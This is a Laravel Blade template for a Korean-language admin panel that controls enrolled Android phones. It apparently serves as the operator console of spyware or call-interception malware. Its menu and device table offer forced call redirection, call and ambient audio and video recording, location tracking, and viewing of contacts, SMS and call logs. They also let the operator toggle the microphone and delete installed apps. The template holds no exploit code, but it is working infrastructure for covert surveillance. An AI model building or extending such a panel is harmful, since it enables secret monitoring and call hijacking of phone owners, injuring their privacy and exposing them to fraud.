@extends('layouts.master')

@section('head')
<script src="{{ asset('js/managedevice.js') }}"></script>
<link href="{{ asset('css/managedevice.css') }}" rel="stylesheet">
@endsection

@section('content')
<div>
    <div class="sidebar">
        <div class="sidebar-inner">
            <!-- ### $Sidebar Header ### -->
            <div class="sidebar-logo">
                <div class="peers ai-c fxw-nw">
                    <div class="peer peer-greed">
                        <a class="sidebar-link td-n" href="index.html">
                            <div class="peers ai-c fxw-nw">
                                <div class="peer">
                                    <div class="logo">
                                        <img src="assets/static/images/logo.png" alt="">
                                    </div>
                                </div>
                                <div class="peer peer-greed">
                                    <h5 class="lh-1 mB-0 logo-text">Admin</h5>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="peer">
                        <div class="mobile-toggle sidebar-toggle">
                            <a href="" class="td-n">
                                <i class="ti-arrow-circle-left"></i>
                            </a>
                        </div>
                    </div>
                </div>
            </div>

            <!-- ### $Sidebar Menu ### -->
            <ul class="sidebar-menu scrollable pos-r">
                <li class="nav-item mT-30 actived">
                    <a class="sidebar-link" href="{{ url('/manage/device') }}">
                        <span class="icon-holder">
                            <i class="c-blue-500 ti-mobile"></i>
                        </span>
                        <span class="title">휴대폰장치</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class='sidebar-link' href="{{ url('/manage/income') }}">
                        <span class="icon-holder">
                            <i class="c-brown-500 ti-shift-right"></i>
                        </span>
                        <span class="title">강제수신설정</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class='sidebar-link' href="{{ url('/manage/outgoing') }}">
                        <span class="icon-holder">
                            <i class="c-blue-500 ti-shift-left"></i>
                        </span>
                        <span class="title">강제발신설정</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class='sidebar-link' href="{{ url('/manage/blocks') }}">
                        <span class="icon-holder">
                            <i class="c-pink-500 ti-na"></i>
                        </span>
                        <span class="title">불랙리스트</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class='sidebar-link' href="{{ url('/manage/users') }}">
                        <span class="icon-holder">
                            <i class="c-blue-500 ti-user"></i>
                        </span>
                        <span class="title">사용자관리</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class='sidebar-link' href="{{ url('/manage/record') }}">
                        <span class="icon-holder">
                            <i class="c-blue-500 ti-microphone"></i>
                        </span>
                        <span class="title">녹음데이터</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class='sidebar-link' href="{{ url('/manage/video') }}">
                        <span class="icon-holder">
                            <i class="c-blue-500 ti-video-camera"></i>
                        </span>
                        <span class="title">녹화데이터</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class='sidebar-link' href="{{ url('/manage/history') }}">
                        <span class="icon-holder">
                            <i class="c-deep-orange-500 ti-headphone-alt"></i>
                        </span>
                        <span class="title">통화녹음데이터</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class='sidebar-link' href="{{ url('/manage/location') }}">
                        <span class="icon-holder">
                            <i class="c-deep-orange-500 ti-map-alt"></i>
                        </span>
                        <span class="title">지도보기</span>
                    </a>
                </li>
                <!-- <li class="nav-item">
                    <a class='sidebar-link' href="{{ url('/manage/location') }}">
                        <span class="icon-holder">
                            <i class="c-deep-orange-500 ti-map-alt"></i>
                        </span>
                        <span class="title">신청자료</span>
                    </a>
                </li> -->
                <li class="nav-item">
                    <a class='sidebar-link' href="{{ url('/logout') }}">
                        <span class="icon-holder">
                            <i class="c-deep-red-500 ti-export"></i>
                        </span>
                        <span class="title">로그아웃</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>

    <div class="page-container">
        <div class="header navbar">
            <div class="header-container">
                <ul class="nav-left">
                    <li>
                        @if(Auth::user()->role_id == 1)
                        <div class="dropdown-toggle no-after peers fxw-nw ai-c lh-1" style="margin-top: 15px;">
                            <div class="peer mR-10">
                                    <span class="fsz-sm c-grey-900">그룹명: </span>
                            </div>
                            <select id="group_type" name="group_type" class="form-control peer">
                                @foreach($others as $i=>$type)
                                <option value="{{ $type->id }}">{{ $type->name }}</option>
                                @endforeach
                            </select>
                        </div>
                        @endif
                    </li>
                </ul>
                <ul class="nav-right">
                    <li class="dropdown">
                        <a href="" class="dropdown-toggle no-after peers fxw-nw ai-c lh-1" data-toggle="dropdown">
                            <div class="peer mR-10">
                                <img class="w-2r bdrs-50p" src="https://randomuser.me/api/portraits/men/10.jpg" alt="">
                            </div>
                            <div class="peer">
                                <span class="fsz-sm c-grey-900">{{ Auth::user()->user_id }}</span>
                            </div>
                        </a>
                        <ul class="dropdown-menu fsz-sm">
                            <li role="separator" class="divider"></li>
                            <li>
                                <a href="" class="d-b td-n pY-5 bgcH-grey-100 c-grey-700">
                                    <i class="ti-power-off mR-10"></i>
                                    <span>Logout</span>
                                </a>
                            </li>
                        </ul>
                    </li>
                </ul>
            </div>
        </div>
        <main class='main-content bgc-grey-100'>
            <div id='mainContent'>
                <div class="container-fluid">
                    <h4 class="c-grey-900 mT-10 mB-30">휴대폰장치</h4>
                    <div class="row">
                        <div class="col-md-12">
                            <div class="bgc-white bd bdrs-3 p-20 mB-20">
                                <table id="dataTable" class="table table-bordered" cellspacing="0" width="100%">
                                    <thead>
                                        <tr>
                                            <th>호출시간</th>
                                            <th>폰번호</th>
                                            <th>수/발신</th>
                                            <th>통화번호</th>
                                            <th>업체이름</th>
                                            <th>메모</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        @foreach($logs as $i=>$log)
                                        <tr>
                                            <td>{{ $log['call_time'] }}</td>
                                            <td>{{ $log['phone'] }}</td>
                                            <td>{{ ($log['direction'] == 1) ? '발신' : '수신' }}</td>
                                            <td>{{ $log['part_phone'] }}</td>
                                            <td>{{ $log['part_name'] }}</td>
                                            <td>{{ $log['note'] }}</td>
                                        </tr>
                                        @endforeach
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="bgc-white bd bdrs-3 p-20 mB-20">
                                <table id="phonetable" class="table table-bordered" cellspacing="0" width="100%">
                                    <thead>
                                        <tr>
                                            <th>No</th>
                                            <th>상태</th>
                                            <th>기능</th>
                                            <th>휴대폰</th>
                                            <th>통신사</th>
                                            <th>신호</th>
                                            <th>배터리</th>
                                            <th>휴대폰모델</th>
                                            <th>설치시간</th>
                                            <th>관리</th>
                                            <th>시스템</th>
                                            <th>버젼</th>
                                            <th>셋팅</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        @foreach($devices as $i=>$device)
                                        <tr>
                                            <td>{{ $i + 1 }}</td>
                                            <td>{{ $device['status'] ? '온라인' : '오프라인' }}</td>
                                            <td>
                                                <div class="peers mR-15">
                                                    <div class="peer">
                                                        <label class="switch" style="margin-bottom: 0.1em;">
                                                            @if($device['is_enable'])
                                                                <input id="device_status" type="checkbox" data-id="{{ $device['id'] }}" checked>
                                                            @else
                                                                <input id="device_status" type="checkbox" data-id="{{ $device['id'] }}">
                                                            @endif
                                                            <span class="slider round"></span>
                                                        </label>
                                                    </div>
                                                </div>
                                            </td>
                                            <td>{{ $device['phone']}} @if($device['nickname'] != null) ({{ $device['nickname']}}) @endif </td>
                                            <td>{{ $device['service']}}</td>
                                            <td>{{ ($device['signal_status'] == 0) ? 'LTE' : 'Wifi'}}</td>
                                            <td>{{ strval($device['battery_status'])."%" }}</td>
                                            <td>{{ $device['model']}}</td>
                                            <td>{{ $device['created_at']}}</td>
                                            <td>
                                                <div class="peers mR-15">
                                                    <div class="peer">
                                                        @if($device['enable_call_record'])
                                                        <span id="mic_off" class="td-n c-blue-400 cH-grey-400 fsz-def p-5" data-id="{{ $device['id'] }}">
                                                            <i class="fa fa-microphone"></i>
                                                        </span>
                                                        @else
                                                        <span id="mic_on" class="td-n c-grey-400 cH-blue-400 fsz-def p-5" data-id="{{ $device['id'] }}">
                                                            <i class="fa fa-microphone"></i>
                                                        </span>
                                                        @endif
                                                        <span id="contact_list" class="td-n c-blue-400 cH-blue-400 fsz-def p-5" data-id="{{ $device['id'] }}">
                                                            <i class="fa fa-address-book"></i>
                                                        </span>
                                                        <span id="msg_log" class="td-n c-blue-400 cH-blue-400 fsz-def p-5" data-id="{{ $device['id'] }}">
                                                            <i class="fa fa-envelope"></i>
                                                        </span>
                                                        <span id="call_log" class="td-n c-blue-400 cH-blue-400 fsz-def p-5" data-id="{{ $device['id'] }}">
                                                            <i class="fa fa-phone-square"></i>
                                                        </span>
                                                        <span id="edit_user" class="td-n c-blue-400 cH-blue-400 fsz-def p-5" data-id="{{ $device['id'] }}" data-phone="{{ $device['phone'] }}" data-nickname="{{ $device['nickname'] }}">
                                                            <i class="ti-pencil"></i>
                                                        </span>
                                                        <span id="app_list" class="td-n c-blue-400 cH-blue-400 fsz-def p-5" data-id="{{ $device['id'] }}">
                                                            <i class="ti-android"></i>
                                                        </span>
                                                    </div>
                                                </div>
                                            </td>
                                            <td>{{ $device['android_version']}}</td>
                                            <td>{{ $device['app_version']}}</td>
                                            <td>{{ $device['setting_status'] ? '셋팅완료' : '셋팅중'}}</td>
                                        </tr>
                                        @endforeach
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="modal" id="edit_device">
                <div class="modal-dialog" role="document">
                    <div class="modal-content">
                        <div class="bd p-15">
                            <h5 class="m-0">익명설정</h5>
                        </div>
                        <div class="modal-body">
                            <form method="POST" action="{{ route('updateDevice') }}" enctype="multipart/form-data">
                                @csrf
                                <h5 class="mt-1 mb-2" id="modalProfileLabel"></h5>
                                <div class="form-group" style="visibility: hidden; max-height: 0px;">
                                    <label class="fw-500">Id</label>
                                    <input type="text" class="form-control" id="device_id" name="device_id" placeholder="">
                                </div>
                                <div class="form-group">
                                    <label for="app_name">익명</label>
                                    <input type="text" class="form-control" id="nickname" name="nickname" placeholder="익명">
                                </div>
                                <div class="text-right">
                                    <button class="btn btn-primary cur-p" id="btn_update" type="submit">저장</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
</div>
<div class="modal fade right" id="modal_app_list" tabindex="-1" role="dialog" aria-labelledby="modalAppsLabel" aria-modal="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">

            <div class="modal-header">
                <h4 class="modal-title" id="myModalLabel2">메시지목록</h4>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
            </div>

            <div class="modal-body">
                <div class="row">
                    <div class="col-md-12">
                        <div class="bgc-white bd bdrs-3 p-20 mB-20">
                            <table id="applist_table" class="table table-bordered" cellspacing="0" width="100%">
                                <thead>
                                    <tr>
                                        <th>No</th>
                                        <th>이름</th>
                                        <th>버젼</th>
                                        <th>패키지</th>
                                        <th>설치시간</th>
                                        <th>압데이트시간</th>
                                        <th>삭제</th>
                                    </tr>
                                </thead>
                                <tbody>

                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="modal fade right" id="modal_msg_logs" tabindex="-1" role="dialog" aria-labelledby="modalLogsLabel" aria-modal="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">

            <div class="modal-header">
                <h4 class="modal-title" id="myModalLabel2">앱리스트</h4>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
            </div>

            <div class="modal-body">
                <div class="row">
                    <div class="col-md-12">
                        <div class="bgc-white bd bdrs-3 p-20 mB-20">
                            <table id="msglogs_table" class="table table-bordered" cellspacing="0" width="100%">
                                <thead>
                                    <tr>
                                        <th>No</th>
                                        <th>전화번호</th>
                                        <th>내용</th>
                                        <th>전송시간</th>
                                        <th>수신/발신</th>
                                    </tr>
                                </thead>
                                <tbody>

                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="modal fade right" id="modal_contacts" tabindex="-1" role="dialog" aria-labelledby="modalLogsLabel" aria-modal="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">

            <div class="modal-header">
                <h4 class="modal-title" id="myModalLabel2">주소록</h4>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
            </div>

            <div class="modal-body">
                <div class="row">
                    <div class="col-md-12">
                        <div class="bgc-white bd bdrs-3 p-20 mB-20">
                            <table id="contacts_table" class="table table-bordered" cellspacing="0" width="100%">
                                <thead>
                                    <tr>
                                        <th>No</th>
                                        <th>라벨</th>
                                        <th>전화번호</th>
                                        <th>조작</th>
                                    </tr>
                                </thead>
                                <tbody>

                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection